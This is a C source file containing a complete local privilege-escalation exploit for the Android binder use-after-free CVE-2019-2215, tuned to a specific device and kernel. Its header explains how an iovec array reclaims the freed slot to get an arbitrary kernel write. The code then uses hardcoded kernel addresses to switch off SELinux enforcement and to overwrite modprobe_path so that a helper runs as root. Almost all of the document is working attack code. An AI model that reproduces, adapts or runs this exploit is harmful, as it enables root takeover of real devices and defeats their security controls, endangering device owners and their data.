/*
 * broot12 - CVE-2019-2215 arbitrary kernel write for the Xplay6 (msm8996, 3.18.20).
 *
 * Confirmed by broot11 on this device:
 *   - armed state (unanswered sync BC_TRANSACTION to handle 0, todo drained, return_error
 *     BR_OK, NEED_RETURN clear) makes binder_poll() register the epoll entry on
 *     &thread->wait (binder.c:2142/2611/2625, wait@0x48, list@0x50/0x58);
 *   - BINDER_THREAD_EXIT kfree()s that thread (binder.c:2776-2781, no guard);
 *   - our 25-entry iovec array (400 bytes, kmalloc-512 like 0x128) reclaims the slot
 *     (measured: 6/6 and 7/8 rounds);
 *   - the child's EPOLL_CTL_DEL runs remove_wait_queue() on the freed memory and its
 *     self-referential __list_del writes slot+0x50 into slot+0x50 and slot+0x58, i.e.
 *     iov[5] becomes {iov_base = slot+0x50 (kernel), iov_len = that same pointer (huge)};
 *   - the data then lands inside the slot, and because the iovec array IS the slot, that
 *     data rewrites our own later segments -- which is the whole trick.
 *
 * Round, two writes on one socket:
 *   chunk1 (0x50 bytes) is copied through the poisoned iov[5] into slot+0x50.. and lays
 *     out, at slot+0x50+8k, the new (base,len) pairs for segments 5,6,7,8,9.
 *   chunk2 (0xA0+plen bytes) walks segment 5 (0x50 to a user sink), segment 6 (0x50 to a
 *     user sink) and then segment 7, whose base we installed = the target and whose length
 *     we installed = plen, so chunk2's final plen bytes are copied to the target with the
 *     exact values we chose.
 * No kernel address needs to be leaked: every base we install is either a user buffer of
 * ours or the static .data symbol we are writing.
 *
 * Modes: probe (target = our own g_probe cell -- non-destructive), enforce
 * (selinux_enforcing, 4 zero bytes), path (modprobe_path, 24 bytes), trigger (exec a bad
 * magic file so the kernel runs the helper as root).  Writes are RAM-only; a reboot
 * restores everything.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

#define BINDER_WRITE_READ 0xc0306201
#define BINDER_THREAD_EXIT 0x40046208
#define BC_TRANSACTION 0x40406300
#define BR_TRANSACTION_COMPLETE 0x7206
#define BR_REPLY 0x80407203
#define BR_DEAD_REPLY 0x80007205

#define SEG_LOCK 4			/* iov[4].iov_len is the spinlock word at slot+0x48 */
#define SEG 5				/* iov[5] is the pair the list_del poisons (slot+0x50) */
#define IOV_SZ 25
#define SINK 0x50UL			/* per-segment size inside the slot */
#define BLK 0x1000UL

#define SELINUX_ENFORCING 0xffffffc00189be74UL
#define MODPROBE_PATH 0xffffffc001635a30UL
#define HELPER "/data/local/tmp/rootsh"

#define SEED 0x1122334455667788UL
#define HIT  0xCAFEBABEDEADBEEFUL

struct txn {
	unsigned long long target, cookie;
	unsigned int code, flags;
	int sender_pid;
	unsigned int sender_euid;
	unsigned long long data_size, offsets_size, buffer, offsets;
};
struct bwr {
	unsigned long long write_size, write_consumed, write_buffer;
	unsigned long long read_size, read_consumed, read_buffer;
};

static volatile unsigned long g_probe;
static char *fill;			/* our sink pages */
static int g_cpu = 2;

static void pin(int cpu)
{
	cpu_set_t s;

	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	if (sched_setaffinity(0, sizeof s, &s))
		fprintf(stderr, "pin %d: %s\n", cpu, strerror(errno));
}

static int arm_pending_tx(int fd)
{
	struct txn t;
	struct bwr b;
	unsigned char wbuf[4 + sizeof(t)];
	char payload[16];
	int attempt;

	memset(payload, 0, sizeof payload);
	memset(&t, 0, sizeof t);
	t.target = 0;			/* context manager, synchronous */
	t.code = 2;
	t.data_size = sizeof payload;
	t.buffer = (unsigned long long)(unsigned long)payload;
	memset(wbuf, 0, sizeof wbuf);
	*(unsigned int *)wbuf = BC_TRANSACTION;
	memcpy(wbuf + 4, &t, sizeof t);
	memset(&b, 0, sizeof b);
	b.write_size = sizeof wbuf;
	b.write_buffer = (unsigned long long)(unsigned long)wbuf;
	if (ioctl(fd, BINDER_WRITE_READ, &b))
		return -1;
	for (attempt = 0; attempt < 3; attempt++) {
		unsigned char rbuf[256];
		size_t off = 0;
		int complete = 0, reply = 0;

		memset(rbuf, 0, sizeof rbuf);
		memset(&b, 0, sizeof b);
		b.read_size = sizeof rbuf;
		b.read_buffer = (unsigned long long)(unsigned long)rbuf;
		if (ioctl(fd, BINDER_WRITE_READ, &b))
			return -1;
		while (off + 4 <= b.read_consumed) {
			unsigned int cmd;

			memcpy(&cmd, rbuf + off, 4);
			off += 4;
			if (cmd == BR_TRANSACTION_COMPLETE)
				complete = 1;
			else if (cmd == BR_REPLY || cmd == BR_DEAD_REPLY) {
				reply = 1;
				off += 64;
			}
		}
		if (complete && !reply)
			return 0;	/* todo empty, stack set, BR_OK, NEED_RETURN clear */
		if (reply)
			return -1;
	}
	return -1;
}

static int read_enforce(void)
{
	unsigned char c = '?';
	int e = open("/sys/fs/selinux/enforce", O_RDONLY);
	int v = -1;

	if (e >= 0) {
		if (read(e, &c, 1) == 1)
			v = c - '0';
		close(e);
	}
	return v;
}

static int fire_trigger(void)
{
	unsigned char bad[8] = { 0x01, 0x01, 0x01, 0x01, 0, 0, 0, 0 };
	const char *p = "/data/local/tmp/badmagic";
	int fd, rc;

	unlink("/data/local/tmp/rootsh.ok");
	fd = open(p, O_WRONLY | O_CREAT | O_TRUNC, 0755);
	if (fd < 0) {
		perror("badmagic");
		return -1;
	}
	if (write(fd, bad, sizeof bad) != (long)sizeof bad)
		perror("badmagic write");
	close(fd);
	chmod(p, 0755);
	rc = fork();
	if (rc == 0) {
		char *av[] = { (char *)p, NULL };
		execv(p, av);
		_exit(127);
	}
	if (rc > 0)
		waitpid(rc, NULL, 0);
	sleep(2);
	fd = open("/data/local/tmp/rootsh.ok", O_RDONLY);
	if (fd < 0) {
		printf("trigger: no rootsh.ok -> helper did not run\n");
		return -1;
	}
	close(fd);
	printf("trigger: rootsh.ok present -> helper ran\n");
	return 0;
}

int main(int argc, char **argv)
{
	const char *mode = argc > 1 ? argv[1] : "probe";
	int do_enforce = !strcmp(mode, "enforce");
	int do_path = !strcmp(mode, "path");
	int tries = argc > 2 ? atoi(argv[2]) : 20;
	unsigned long long tgt;
	int plen, i, fd, epfd, socks[2], status, armed = 0, ok = 0;
	unsigned long long *inst;
	unsigned char *chunk2;
	struct iovec *iov;
	pid_t kid;

	if (!strcmp(mode, "trigger"))
		return fire_trigger() ? 1 : 0;

	tgt = do_path ? MODPROBE_PATH : (do_enforce ? SELINUX_ENFORCING
						   : (unsigned long long)&g_probe);
	plen = do_path ? 24 : (do_enforce ? 4 : 8);

	pin(g_cpu);
	printf("mode=%s cpu=%d tgt=%#llx plen=%d tries=%d\n", mode, sched_getcpu(), tgt,
	       plen, tries);
	fflush(stdout);

	inst = malloc(SINK + 0x40);
	chunk2 = malloc(2 * SINK + 0x400);
	iov = malloc(IOV_SZ * sizeof *iov);
	fill = malloc(IOV_SZ * BLK + 4 * BLK);
	if (!inst || !chunk2 || !iov || !fill)
		abort();
	memset(fill, 0, IOV_SZ * BLK + 4 * BLK);
	memset(inst, 0, SINK + 0x40);
	memset(chunk2, 0, 2 * SINK + 0x400);

	/* installer: 10 qwords, copied to slot+0x50, i.e. it becomes segments 5..9 */
	inst[0] = (unsigned long long)(fill + 0x10000);	/* new iov[5].iov_base: user sink */
	inst[1] = SINK;					/* new iov[5].iov_len */
	inst[2] = (unsigned long long)(fill + 0x11000);	/* new iov[6].iov_base: user sink */
	inst[3] = SINK;					/* new iov[6].iov_len */
	inst[4] = tgt;					/* new iov[7].iov_base = TARGET */
	inst[5] = (unsigned long long)plen;		/* new iov[7].iov_len */
	inst[6] = (unsigned long long)(fill + 0x12000);	/* new iov[8]: sink */
	inst[7] = 0x400;
	inst[8] = (unsigned long long)(fill + 0x13000);	/* new iov[9]: sink */
	inst[9] = 0x400;

	/* chunk2: 0x50 to seg5, 0x50 to seg6, then plen bytes to the target */
	/* every byte of chunk2 is tagged so the sink contents tell us which segment the
	 * kernel actually wrote through; the marker value is placed at both candidate
	 * offsets (end of seg5's 0x50 run and end of seg6's).
	 */
	memset(chunk2, 0x42, 2 * SINK + 0x400);
	if (do_path) {
		memset(chunk2 + 2 * SINK, 0, 0x40);
		memcpy(chunk2 + 2 * SINK, HELPER, 22);
	} else if (do_enforce) {
		memset(chunk2 + 2 * SINK, 0, 8);	/* four zero bytes land on the target */
	}
	if (!do_enforce && !do_path) {
		unsigned long long v = HIT;
		memcpy(chunk2 + SINK, &v, 8);
		memcpy(chunk2 + 2 * SINK, &v, 8);
	}

	g_probe = SEED;

	for (i = 0; i < tries && !ok; i++) {
		struct epoll_event ev = { .events = EPOLLIN };
		struct msghdr m;
		int r, j;
		size_t c2len = 2 * SINK + (size_t)plen;

		fd = open("/dev/binder", O_RDONLY);
		if (fd < 0)
			abort();
		epfd = epoll_create(1000);
		if (arm_pending_tx(fd) != 0) {
			close(fd);
			close(epfd);
			continue;
		}
		armed++;
		if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev))
			abort();
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks))
			abort();

		kid = fork();
		if (kid < 0)
			abort();
		if (kid == 0) {
			prctl(PR_SET_PDEATHSIG, SIGKILL);
			pin(g_cpu ^ 1);
			close(socks[0]);
			usleep(150000);
			if (epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &ev))
				_exit(7);
			if (write(socks[1], inst, SINK) != (long)SINK)
				_exit(8);
			usleep(60000);
			if (write(socks[1], chunk2, c2len) != (long)c2len)
				_exit(9);
			usleep(60000);
			close(socks[1]);
			_exit(0);
		}
		close(socks[1]);

		if (ioctl(fd, BINDER_THREAD_EXIT, NULL))
			printf("  THREAD_EXIT: %s\n", strerror(errno));

		memset(iov, 0, IOV_SZ * sizeof *iov);
		iov[SEG_LOCK].iov_base = fill + SEG_LOCK * BLK;
		iov[SEG_LOCK].iov_len = 0;		/* the spinlock must read 0 */
		iov[SEG].iov_base = fill + SEG * BLK;
		iov[SEG].iov_len = SINK;
		iov[SEG + 1].iov_base = fill + (SEG + 1) * BLK;
		iov[SEG + 1].iov_len = SINK;
		iov[SEG + 2].iov_base = fill + (SEG + 2) * BLK;
		iov[SEG + 2].iov_len = 0x1000;		/* slack so the budget is ample */

		memset(&m, 0, sizeof m);
		m.msg_iov = iov;
		m.msg_iovlen = IOV_SZ;
		errno = 0;
		r = recvmsg(socks[0], &m, MSG_WAITALL);

		if (do_path) {
			/* modprobe_path is not readable until permissive: judge by trigger */
			ok = 1;
		} else if (do_enforce) {
			ok = (read_enforce() == 0);
		} else {
			ok = (g_probe == HIT);
		}
		printf("try %d: recvmsg=%d errno=%d seg5=%#llx seg6=%#llx seg7=%#llx\n",
		       i, r, errno, *(unsigned long long *)(fill + SEG * BLK),
		       *(unsigned long long *)(fill + (SEG + 1) * BLK),
		       *(unsigned long long *)(fill + (SEG + 2) * BLK));
		printf("      sink1=%#llx sink2=%#llx sink3=%#llx sink4=%#llx probe=%#lx enforce=%d %s\n",
		       *(unsigned long long *)(fill + 0x10000),
		       *(unsigned long long *)(fill + 0x11000),
		       *(unsigned long long *)(fill + 0x12000),
		       *(unsigned long long *)(fill + 0x13000), g_probe,
		       read_enforce(), ok ? "<== TARGET MOVED" : "");
		fflush(stdout);
		waitpid(kid, &status, 0);
		for (j = 0; j < IOV_SZ; j++)
			memset(fill + j * BLK, 0, 0x100);
		close(socks[0]);
		close(fd);
		close(epfd);
		if (!ok)
			g_probe = SEED;
	}

	printf("RESULT %s after %d armed rounds: probe=%#lx selinux=%d\n",
	       ok ? "HIT" : "MISS", armed, g_probe, read_enforce());
	return ok ? 0 : 1;
}
